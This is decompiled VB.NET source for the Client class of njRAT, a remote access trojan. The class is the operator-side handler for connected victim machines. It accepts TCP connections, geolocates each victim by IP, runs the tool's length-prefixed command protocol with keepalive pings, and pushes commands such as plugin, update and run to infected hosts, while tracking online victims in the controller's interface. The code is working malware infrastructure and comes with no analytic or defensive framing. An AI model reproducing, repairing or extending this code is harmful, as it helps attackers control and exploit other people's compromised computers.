Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.njRAT

Namespace NJRAT.NJRAT
	' Token: 0x02000010 RID: 16
	Public Class Client
		' Token: 0x060000FF RID: 255 RVA: 0x00009948 File Offset: 0x00007B48
		Public Sub New(c As TcpClient, sk As SK)
			Me.bool_0 = False
			Me.CN = True
			Me.CName = "Unknown"
			Me.Co = "--"
			Me.int_0 = 5
			Me.Isend = False
			Me.isPL = False
			Me.IsPNGED = False
			Me.lastAC = String.Empty
			Me.lastPC = Nothing
			Me.lastPing = DateTime.Now
			Me.msec = 0L
			Me.NoPing = False
			Me.plg = New List(Of String)()
			Me.string_0 = String.Empty
			Me.t = AddressOf Me.lam__6
			Me.M = New MemoryStream()
			Me.b = New Byte(0) {}
			Me.string_1 = String.Empty
			Me.Length = -1L
			Me.osk = Nothing
			Me.bool_1 = False
			Me.Client = c
			Me.SK = sk
			Try
				Dim gclass As GClass4 = Class7.gclass3_0.method_4(c.Client.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0))
				Me.Co = gclass.method_0()
				Me.CName = gclass.method_1()
				Dim flag As Boolean = Operators.CompareString(Me.Co, "A1", False) = 0 Or Operators.CompareString(Me.Co, "A2", False) = 0
				If flag Then
					Me.Co = "--"
				End If
				Dim flag2 As Boolean = Not Class7.form1_0.IMG2.Images.ContainsKey(Me.Co + ".png")
				If flag2 Then
					Me.Co = "--"
				End If
				Me.COI = CType(Class7.form1_0.IMG2.Images(Me.Co + ".png"), Bitmap)
			Catch ex As Exception
			End Try
			Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, AddressOf Me.b_read, Nothing)
		End Sub

		' Token: 0x06000100 RID: 256 RVA: 0x00009B90 File Offset: 0x00007D90
		<DebuggerStepThrough()>
		<CompilerGenerated()>
		Private Sub lam__5(object_0 As Object)
			Me.SEND_(CType(object_0, Byte()))
		End Sub

		' Token: 0x06000101 RID: 257 RVA: 0x00009BA0 File Offset: 0x00007DA0
		<CompilerGenerated()>
		<DebuggerStepThrough()>
		Private Sub lam__6(object_0 As Object)
			Me.method_0()
		End Sub

		' Token: 0x06000102 RID: 258 RVA: 0x00009BAC File Offset: 0x00007DAC
		Public Sub b_read(ar As IAsyncResult)
			Dim flag As Boolean = Not Me.CN Or Me.bool_1
			If Not flag Then
				Try
					Dim num As Integer = 0
					Try
						num = Me.Client.Client.EndReceive(ar)
					Catch ex As SocketException
						Dim ex2 As SocketException = ex
						Me.string_1 = ex2.SocketErrorCode.ToString()
						GoTo IL_417
					End Try
					Dim flag2 As Boolean = num <= 0
					If flag2 Then
						GoTo IL_417
					End If
					Class7.long_1 += CLng(num)
					Dim flag3 As Boolean = Me.Length = -1L
					If flag3 Then
						Dim flag4 As Boolean = Me.b(0) = 0
						If flag4 Then
							Dim array As Byte() = Me.M.ToArray()
							Me.Length = Conversions.ToLong(Class6.smethod_12(array))
							Me.M.Dispose()
							Me.M = New MemoryStream()
							Dim flag5 As Boolean = Me.Length = 0L
							If flag5 Then
								Me.Length = -1L
								Dim flag6 As Boolean = Me.L Is Nothing And Not Me.isPL
								If flag6 Then
									Me.string_1 = "LTimeOut"
									GoTo IL_417
								End If
								Dim num2 As Integer = CInt(Math.Round(Math.Round((DateAndTime.Now.Subtract(Me.lastPing).TotalMilliseconds - 10.0) / 1.5)))
								Dim flag7 As Boolean = num2 < 0
								If flag7 Then
									num2 = 0
								End If
								Dim flag8 As Boolean = num2 > 999
								If flag8 Then
									num2 = 999
								End If
								Me.lastPing = DateAndTime.Now
								Me.IsPNGED = False
								Dim text As String = "P" + Class7.string_1 + num2.ToString("000")
								Dim gclass As GClass12 = New GClass12(Me, Class6.smethod_11(text))
								Dim req As List(Of GClass12) = Me.SK.REQ
								Dim obj As Object = req
								SyncLock obj
									Me.SK.REQ.Add(gclass)
								End SyncLock
								While Not gclass.bool_0
									Thread.Sleep(1)
								End While
								GoTo IL_394
							Else
								Me.b = New Byte(CInt((Me.Length - 1L)) + 1 - 1 + 1 - 1) {}
							End If
						Else
							Me.M.WriteByte(Me.b(0))
						End If
					Else
						Me.M.Write(Me.b, 0, num)
						Dim flag9 As Boolean = Me.M.Length = Me.Length
						If flag9 Then
							Me.Length = -1L
							Dim gclass2 As GClass12 = New GClass12(Me, Me.M.ToArray())
							Dim req2 As List(Of GClass12) = Me.SK.REQ
							Dim obj2 As Object = req2
							SyncLock obj2
								Me.SK.REQ.Add(gclass2)
							End SyncLock
							While Not gclass2.bool_0
								Thread.Sleep(1)
							End While
							Me.M.Dispose()
							Me.M = New MemoryStream()
							Me.b = New Byte(0) {}
						Else
							Me.b = New Byte(CInt((Me.Length - Me.M.Length - 1L)) + 1 - 1 + 1 - 1) {}
						End If
					End If
					Thread.Sleep(1)
				Catch ex3 As Exception
					Me.string_1 = "RError"
					GoTo IL_417
				End Try
				IL_394:
				Dim flag10 As Boolean = Not Me.CN
				If flag10 Then
					Return
				End If
				Try
					Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, AddressOf Me.b_read, Nothing)
					Return
				Catch ex4 As SocketException
					Dim ex5 As SocketException = ex4
					Me.string_1 = ex5.SocketErrorCode.ToString()
				End Try
			End If
			IL_417:
			Me.CN = False
		End Sub

		' Token: 0x06000103 RID: 259 RVA: 0x0000A054 File Offset: 0x00008254
		Public Sub Close()
			Dim flag As Boolean = Not Me.bool_1
			If flag Then
				Me.bool_1 = True
				Me.CN = False
				Try
					Me.t.Dispose()
				Catch ex As Exception
				End Try
				Try
					Me.M.Dispose()
				Catch ex2 As Exception
				End Try
				Try
					Dim connected As Boolean = Me.Client.Connected
					If connected Then
						Me.Client.GetStream().Close()
					End If
				Catch ex3 As Exception
				End Try
				Try
					Me.Client.Client.Close()
				Catch ex4 As Exception
				End Try
				Me.Isend = False
				Me.plg.Clear()
				Dim flag2 As Boolean = Operators.CompareString(Me.string_1, String.Empty, False) = 0
				If flag2 Then
					Me.string_1 = "Disconnected"
				End If
				Dim flag3 As Boolean = Me.L IsNot Nothing And Not Me.isPL
				If flag3 Then
					Dim flag4 As Boolean = Class7.class8_0.bool_1
					If flag4 Then
						Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Color.DarkSlateBlue, Me.COI, Me.ip(), Color.IndianRed, RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.L)), Color.DarkRed, Me.string_1 })
					End If
				Else
					Dim bool_ As Boolean = Class7.class8_0.bool_2
					If bool_ Then
						Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), Me.COI, Color.Red, Me.ip(), Color.IndianRed, Me.string_1 })
					End If
				End If
				Dim online As Collection = Class7.sk_0.Online
				Dim obj As Object = online
				SyncLock obj
					Dim flag5 As Boolean = Class7.sk_0.Online.Contains(Me.ip())
					If flag5 Then
						Class7.sk_0.Online.Remove(Me.ip())
					End If
				End SyncLock
				Dim flag6 As Boolean = Me.L IsNot Nothing
				If flag6 Then
					Class7.form1_0.L1.method_9(Me.L)
				End If
				Me.L = Nothing
			End If
		End Sub

		' Token: 0x06000104 RID: 260 RVA: 0x0000A388 File Offset: 0x00008588
		Public Function ip() As String
			Dim flag As Boolean = Me.string_0.Length <= 0
			If flag Then
				Try
					Me.string_0 = Me.Client.Client.RemoteEndPoint.ToString()
				Catch ex As Exception
					Me.string_0 = Me.GetHashCode().ToString()
				End Try
			End If
			Return Me.string_0
		End Function

		' Token: 0x06000105 RID: 261 RVA: 0x0000A41C File Offset: 0x0000861C
		Private Sub method_0()
			Dim flag As Boolean = Not(Me.bool_0 Or Me.bool_1)
			If flag Then
				SyncLock Me
					Me.bool_0 = True
					Dim flag2 As Boolean = Not Me.CN
					If flag2 Then
						Me.Close()
					Else
						Dim totalSeconds As Double = DateAndTime.Now.Subtract(Me.lastPing).TotalSeconds
						Dim flag3 As Boolean = Not Me.isPL AndAlso (Me.L Is Nothing And totalSeconds > 8.0)
						If flag3 Then
							Me.string_1 = "LTimeOut"
							Me.Close()
						Else
							Dim flag4 As Boolean = Not Me.NoPing
							If flag4 Then
								Dim flag5 As Boolean = Not Me.IsPNGED
								If flag5 Then
									Dim flag6 As Boolean = totalSeconds >= CDbl(Me.int_0)
									If flag6 Then
										Me.int_0 = 15
										Dim empty As String = String.Empty
										Me.SEND_(Class6.smethod_11(empty))
										Me.IsPNGED = True
										Me.lastPing = DateAndTime.Now
										Dim flag7 As Boolean = Not Me.CN
										If flag7 Then
											Me.Close()
											GoTo IL_227
										End If
									End If
								Else
									Dim flag8 As Boolean = Me.SendingProgress = 0 And Not Me.isPL And totalSeconds > 6.0 And Me.L IsNot Nothing
									If flag8 Then
										Try
											Dim flag9 As Boolean = Me.L.Cells.Count > Class7.int_10
											If flag9 Then
												Me.L.Cells(Class7.int_10).Value = "TimeOut"
												Me.L.Cells(Class7.int_10).Style.ForeColor = Color.Red
												Me.SEND_(New Byte(1024) {})
												Dim flag10 As Boolean = Not Me.CN
												If flag10 Then
													Me.Close()
													GoTo IL_227
												End If
											End If
										Catch ex As Exception
											Me.Close()
											GoTo IL_227
										End Try
									End If
								End If
							End If
							Me.bool_0 = False
							IL_227:
						End If
					End If
				End SyncLock
			End If
		End Sub

		' Token: 0x06000106 RID: 262 RVA: 0x0000A698 File Offset: 0x00008898
		Public Function rp() As Integer
			Dim flag As Boolean = Me.Length = -1L
			Dim result As Integer
			If flag Then
				result = 0
			Else
				Dim num As Integer
				Try
					num = Class6.smethod_1(CInt(Me.M.Length), CInt(Me.Length))
				Catch ex As Exception
					num = 0
				End Try
				result = num
			End If
			Return result
		End Function

		' Token: 0x06000107 RID: 263 RVA: 0x0000A70C File Offset: 0x0000890C
		Public Function Send(S As String) As Boolean
			Me.Send(Class6.smethod_11(S))
			Dim result As Boolean
			Return result
		End Function

		' Token: 0x06000108 RID: 264 RVA: 0x0000A730 File Offset: 0x00008930
		Public Sub Send(b As Byte())
			Dim cn As Boolean = Me.CN
			If cn Then
				ThreadPool.QueueUserWorkItem(AddressOf Me.lam__5, b)
			End If
		End Sub

		' Token: 0x06000109 RID: 265 RVA: 0x0000A760 File Offset: 0x00008960
		Public Sub SEND_(b As Byte())
			Try
				SyncLock Me
					Me.SendingProgress = 0
					Dim array As String() = Nothing
					Dim flag As Boolean = b.Length > 3
					If flag Then
						array = New String() { Conversions.ToString(Strings.ChrW(CInt(b(0)))) + Conversions.ToString(Strings.ChrW(CInt(b(1)))) + Conversions.ToString(Strings.ChrW(CInt(b(2)))) }
						Dim flag2 As Boolean = Not(Operators.CompareString(array(0), "inv", False) = 0 Or Operators.CompareString(array(0), "rn" + Conversions.ToString(Strings.ChrW(CInt(b(2)))), False) = 0 Or Operators.CompareString(array(0), "up" + Conversions.ToString(Strings.ChrW(CInt(b(2)))), False) = 0 Or Operators.CompareString(array(0), "ret", False) = 0 Or Operators.CompareString(array(0), "PLG", False) = 0)
						If flag2 Then
							array = Nothing
						End If
					End If
					Dim num As Integer = 0
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = b.Length.ToString() + vbNullChar
					Dim array2 As Byte() = Class6.smethod_11(text)
					memoryStream.Write(array2, 0, array2.Length)
					memoryStream.Write(b, 0, b.Length)
					Dim i As Integer = 1
					Dim length As Long = memoryStream.Length
					memoryStream.Position = 0L
					While i >= 1
						Dim array3 As Byte() = New Byte(10240) {}
						i = memoryStream.Read(array3, 0, array3.Length)
						Me.Client.Client.Poll(-1, SelectMode.SelectWrite)
						Try
							Me.Client.Client.Send(array3, 0, i, SocketFlags.None)
						Catch ex As SocketException
							Dim ex2 As SocketException = ex
							Me.SendingProgress = 0
							Me.string_1 = ex2.SocketErrorCode.ToString()
							Me.CN = False
							Return
						End Try
						Class7.long_0 += CLng(i)
						num += i
						Dim flag3 As Boolean = Not Me.CN Or Me.bool_1
						If flag3 Then
							Return
						End If
						Dim flag4 As Boolean = array <> Nothing
						If flag4 Then
							Me.SendingProgress = Class6.smethod_1(num, CInt(length))
						End If
					End While
					memoryStream.Dispose()
					Me.SendingProgress = 0
				End SyncLock
			Catch ex3 As Exception
				Me.SendingProgress = 0
				Me.string_1 = "SError"
				Me.CN = False
			End Try
		End Sub

		' Token: 0x0400006C RID: 108
		Public b As Byte()

		' Token: 0x0400006D RID: 109
		Private bool_0 As Boolean

		' Token: 0x0400006E RID: 110
		Private bool_1 As Boolean

		' Token: 0x0400006F RID: 111
		Public Client As TcpClient

		' Token: 0x04000070 RID: 112
		Public CN As Boolean

		' Token: 0x04000071 RID: 113
		Public CName As String

		' Token: 0x04000072 RID: 114
		Public Co As String

		' Token: 0x04000073 RID: 115
		Public COI As Bitmap

		' Token: 0x04000074 RID: 116
		Public Folder As String

		' Token: 0x04000075 RID: 117
		Private int_0 As Integer

		' Token: 0x04000076 RID: 118
		Public Isend As Boolean

		' Token: 0x04000077 RID: 119
		Public isPL As Boolean

		' Token: 0x04000078 RID: 120
		Public IsPNGED As Boolean

		' Token: 0x04000079 RID: 121
		Public L As DataGridViewRow

		' Token: 0x0400007A RID: 122
		Public lastAC As String

		' Token: 0x0400007B RID: 123
		Public lastPC As DateTime

		' Token: 0x0400007C RID: 124
		Public lastPing As DateTime

		' Token: 0x0400007D RID: 125
		Public Length As Long

		' Token: 0x0400007E RID: 126
		Public M As MemoryStream

		' Token: 0x0400007F RID: 127
		Public msec As Long

		' Token: 0x04000080 RID: 128
		Public NoPing As Boolean

		' Token: 0x04000081 RID: 129
		Public osk As Client

		' Token: 0x04000082 RID: 130
		Public plg As List(Of String)

		' Token: 0x04000083 RID: 131
		Public SendingProgress As Integer

		' Token: 0x04000084 RID: 132
		Public SK As SK

		' Token: 0x04000085 RID: 133
		Private string_0 As String

		' Token: 0x04000086 RID: 134
		Private string_1 As String

		' Token: 0x04000087 RID: 135
		Public t As System.Threading.Timer
	End Class
End Namespace
